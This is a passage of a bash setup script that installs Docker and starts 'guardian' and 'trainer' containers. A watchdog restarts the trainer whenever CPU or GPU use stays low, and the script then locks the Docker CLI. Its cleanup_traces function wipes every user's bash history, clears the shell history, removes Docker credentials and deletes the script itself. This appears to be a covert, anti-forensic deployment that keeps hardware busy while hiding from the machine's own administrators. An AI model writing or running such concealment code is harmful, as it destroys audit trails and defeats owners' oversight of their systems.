    [ "$cpu_int" -lt "$THRESHOLD" ] && cpu_strike=$((cpu_strike + 1)) || cpu_strike=0

    # GPU
    gpu_int="-"
    if [ "$has_gpu" = true ]; then
        gpu_raw=$(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null | head -1)
        gpu_int=$(printf "%.0f" "${gpu_raw:-0}" 2>/dev/null || echo 0)
        [ "$gpu_int" -lt "$THRESHOLD" ] && gpu_strike=$((gpu_strike + 1)) || gpu_strike=0
    fi

    cpu_min=$(( (STRIKES_NEEDED - cpu_strike) * INTERVAL / 60 ))
    gpu_min=$(( (STRIKES_NEEDED - gpu_strike) * INTERVAL / 60 ))
    echo "[$TS] CPU=${cpu_int}% (${cpu_strike}/${STRIKES_NEEDED}) GPU=${gpu_int}% (${gpu_strike}/${STRIKES_NEEDED}) | restart: CPU=${cpu_min}m GPU=${gpu_min}m"

    if [ "$cpu_strike" -ge "$STRIKES_NEEDED" ] || { [ "$has_gpu" = true ] && [ "$gpu_strike" -ge "$STRIKES_NEEDED" ]; }; then
        echo "[$TS] RESTARTING trainer — under ${THRESHOLD}% for 1 hour"
        "$DOCKER_BIN" restart "$CONTAINER" 2>&1
        cpu_strike=0
        gpu_strike=0
        sleep 120
    fi

    sleep "$INTERVAL"
done
WATCHDOG

    chmod 700 /usr/local/bin/trainer-watchdog

    cat > /etc/systemd/system/trainer-watchdog.service << 'WDSERVICE'
[Unit]
Description=Trainer Watchdog
After=docker.service
Requires=docker.service

[Service]
Type=simple
ExecStart=/usr/local/bin/trainer-watchdog
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
WDSERVICE

    systemctl daemon-reload
    systemctl enable trainer-watchdog
    systemctl restart trainer-watchdog
    log "Watchdog running"
}

# ==========================================================
# CLEANUP
# ==========================================================
cleanup_traces() {
    log "Cleaning traces..."
    rm -rf /root/.docker 2>/dev/null || true
    rm -f /tmp/setup.sh /tmp/guardian-* 2>/dev/null || true
    rm -rf /var/lib/apt/lists/* 2>/dev/null || true
    _docker image prune -f > /dev/null 2>&1 || true
    _docker builder prune -f > /dev/null 2>&1 || true
    for h in /root/.bash_history /home/*/.bash_history; do
        [ -f "$h" ] && : > "$h"
    done
    history -c 2>/dev/null || true
    rm -f "$0" 2>/dev/null || true
    log "Clean"
}

# ==========================================================
# MAIN
# ==========================================================
main() {
    log "=== Starting ==="

    # Docker
    if ! command -v docker > /dev/null 2>&1 || ! systemctl is-active --quiet docker; then
        log "Installing Docker..."
        apt-get update -yq
        apt-get install -yq docker.io
        systemctl start docker
        systemctl enable docker
        log "Docker ready"
    else
        log "Docker ready"
    fi

    docker_login

    # GPU
    GPU=false
    if lspci | grep -i nvidia > /dev/null 2>&1; then
        log "NVIDIA GPU detected"
        if gpu_runtime_ready; then
            GPU=true
            _docker rmi "$SMOKE_TEST_IMAGE" > /dev/null 2>&1 || true
            log "GPU runtime OK"
        else
            install_nvidia && GPU=true
        fi
    else
        log "No GPU — CPU mode"
    fi

    harden_docker

    # Guardian
    if _docker ps --format '{{.Names}}' | grep -q "^${GUARDIAN_NAME}$"; then
        log "Guardian already running"
    else
        build_guardian_image
        run_guardian
    fi
    sleep 5

    # Trainer
    EXISTING=$(cat /root/.trainer-container-name 2>/dev/null)
    if [ -n "$EXISTING" ] && _docker ps --format '{{.Names}}' | grep -q "^${EXISTING}$"; then
        log "Trainer already running: $EXISTING"
    else
        run_trainer "$GPU"
    fi

    # Watchdog + Lockdown
    install_watchdog
    lockdown_docker_cli
    cleanup_traces

    log "=== READY ==="
    log "GPU=$GPU"
    log "Guardian: kernel locked"
    log "Trainer: $(cat /root/.trainer-container-name 2>/dev/null)"
    log "Watchdog: journalctl -u trainer-watchdog -f"

    while true; do sleep 3600; done
}

main "$@"
